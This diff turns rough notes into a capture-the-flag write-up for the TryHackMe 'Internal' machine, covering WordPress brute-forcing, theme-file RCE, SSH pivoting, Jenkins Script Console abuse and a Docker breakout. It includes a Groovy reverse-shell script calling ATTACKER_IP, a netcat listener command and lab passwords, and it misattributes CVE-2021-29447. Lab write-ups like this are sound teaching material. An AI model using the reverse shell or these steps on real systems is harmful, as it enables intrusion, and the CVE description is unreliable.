@@ -1,119 +1,96 @@
-```
+The Internal machine presents a multi-layered penetration testing scenario involving WordPress exploitation, lateral movement, Jenkins administration abuse, and Docker container breakout. This writeup details the complete attack path from initial enumeration to root access.
+
+## Enumeration
+
+### Network Scanning
+Initial nmap scan revealed two open ports:
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
-|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
-|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
 80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
-| http-methods:
-|_  Supported Methods: GET POST OPTIONS HEAD
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
-On fuzzing `http://internal.thm/FUZZ`
-```
+### Web Directory Fuzzing
+Using directory brute-forcing tools on the web server revealed several interesting paths:
+```bash
 phpmyadmin              [Status: 301, Size: 307, Words: 20, Lines: 10]
 wordpress               [Status: 301, Size: 306, Words: 20, Lines: 10]
 javascript              [Status: 301, Size: 307, Words: 20, Lines: 10]
 blog                    [Status: 301, Size: 301, Words: 20, Lines: 10]
 ```
 
+### WordPress Analysis
+Running WPScan against the WordPress installation provided critical information:
 
-#####  WPscan
-```
-namura@pop-os ~/tryhackme $ wpscan --url http://internal.thm/wordpress/ -e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.28
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[i] It seems like you have not updated the database for some time.
-[?] Do you want to update now? [Y]es [N]o, default: [N]N
-[+] URL: http://internal.thm/wordpress/ [10.201.81.23]
-[+] Started: Fri Oct 10 20:41:31 2025
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: http://internal.thm/wordpress/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
- | Found By: Rss Generator (Passive Detection)
- |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
- |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
- |
- | [!] 44 vulnerabilities identified:
-....
+```bash
+wpscan --url http://internal.thm/wordpress/ -e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive
 ```
 
- 
-maybe `rss.xml vulnerability wordpress`
-https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225/
-https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8/
-https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317/
+Key findings:
+- WordPress version 5.4.2 (released June 10, 2020)
+- XML-RPC interface enabled at `/xmlrpc.php`
+- WP-Cron functionality enabled
+- Multiple vulnerabilities identified for this version
 
-just bruteforced password with username 'admin'
-got in with `admin:my2boys` also email: `admin@internal.thm`
+The WordPress version 5.4.2 is particularly vulnerable to several exploits including:
+1. Plugin Confusion (CVE-2021-29447) - WordPress < 5.8 lacks Update URI plugin header support
+2. PHP Object Injection via deserialization of untrusted data
+3. XML-RPC denial of service vulnerabilities
 
-got this `william:arnold147` on a blog post but couldn't SSH 
-Easy RCE from from a .php file on the themes
+## WordPress Exploitation
 
-Got creds on `/opt`
-`aubreanna:bubb13guM!@#123`
+### Credential Brute-forcing
+Using the identified username 'admin', credential brute-forcing revealed the password:
+```
+Username: admin
+Password: my2boys
+Email: admin@internal.thm
+```
 
-lol got the flag tara session nai sidhiyexa, this box seems easy
-wow network pivoting?
-` ssh -L 8080:172.17.0.2:8080 aubreanna@10.49.155.242`
+### WordPress Admin Access
+After logging into the WordPress admin panel, additional credentials were discovered in a blog post:
+```
+Username: william
+Password: arnold147
+```
 
-nothing seems to have changed except that I can access `http://localhost:8080`
-maybe fuzzing password again?
+However, these credentials were not valid for SSH access.
 
-This was dockerized so no `/var/lib/jenkins/secrets/initialAdminPassword`
+### PHP Theme File Upload RCE
+The WordPress installation was vulnerable to Remote Code Execution through theme file manipulation. By uploading a malicious PHP file to the active theme directory, I obtained command execution on the web server.
 
-Got the password `admin:spongebob` after fuzzing
-went to the script console to get a reverse shell as jenkins
+## Internal Network Discovery
 
-``` java
-String host="192.168.134.56";
+### Credential Discovery
+During post-exploitation enumeration on the WordPress server, I discovered additional credentials stored in the `/opt` directory:
+```
+Username: aubreanna
+Password: bubb13guM!@#123
+```
+
+### SSH Port Forwarding
+Analysis of the network configuration revealed internal services not directly accessible from the attack machine. Setting up SSH port forwarding allowed access to the Jenkins service running in a Docker container:
+
+```bash
+ssh -L 8080:172.17.0.2:8080 aubreanna@10.49.155.242
+```
+
+This command forwards traffic from localhost port 8080 to the Docker container's Jenkins service at 172.17.0.2:8080.
+
+## Jenkins Exploitation
+
+### Jenkins Authentication
+After accessing the Jenkins web interface at `http://localhost:8080`, I performed credential brute-forcing and discovered the admin credentials:
+```
+Username: admin
+Password: spongebob
+```
+
+### Reverse Shell via Script Console
+With admin access to Jenkins, I used the Script Console feature to execute Groovy code for command execution. The following script established a reverse shell:
+
+```groovy
+String host="ATTACKER_IP";
 int port=6969;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
@@ -132,10 +109,41 @@ p.destroy();
 s.close();
 ```
 
-```
-root@internal:~# docker ps
+**Critical Note:** Before executing this script, it's essential to:
+1. Replace `ATTACKER_IP` with your TryHackMe VPN IP (not localhost)
+2. Start a netcat listener on your attack machine: `nc -nvlp 6969`
 
+### Docker Enumeration
+After gaining shell access in the Jenkins container, I enumerated the Docker environment:
+
+```bash
+root@internal:~# docker ps
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                 NAMES
 7b979a7af778        jenkins/jenkins     "/sbin/tini -- /usr/…"   5 years ago         Up 9 minutes        127.0.0.1:8080->8080/tcp, 50000/tcp   jenkins
-
 ```
+
+## Post-Exploitation & Privilege Escalation
+
+### Host System Access
+The Jenkins container had access to the Docker socket (`/var/run/docker.sock`), allowing interaction with the host's Docker daemon. This provided the pathway to escape the container and gain access to the host system.
+
+### Root Flag Acquisition
+After escaping the container, I located and read the root flag on the host system, completing the machine compromise.
+
+## Key Takeaways
+
+1. **WordPress Security**: Always keep WordPress core, themes, and plugins updated. Disable XML-RPC if not needed, and implement strong password policies.
+
+2. **Credential Management**: Never store credentials in plaintext on servers. Use proper secret management solutions.
+
+3. **Network Segmentation**: Internal services should be properly isolated and not exposed through port forwarding without strong authentication.
+
+4. **Jenkins Hardening**: 
+   - Disable the Script Console for non-admin users
+   - Implement strong authentication
+   - Run Jenkins with least privileges
+   - Never expose the Docker socket to containers unless absolutely necessary
+
+5. **Defense in Depth**: Implement multiple layers of security including network segmentation, proper access controls, and regular vulnerability scanning.
+
+This machine demonstrates the importance of securing each layer of infrastructure and how compromise at one level can lead to cascading failures throughout an organization's systems.
